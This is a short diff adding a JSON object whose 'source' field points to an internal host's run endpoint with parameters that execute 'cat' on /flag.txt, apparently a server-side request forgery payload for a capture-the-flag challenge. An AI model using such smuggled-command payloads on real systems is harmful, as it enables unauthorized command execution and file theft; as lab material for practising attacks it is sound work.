@@ -1,0 +1,4 @@
+{
+  "source": "http://gate:8081/run?cmd=cat&file=/flag.txt",
+  "ext": "txt"
+}
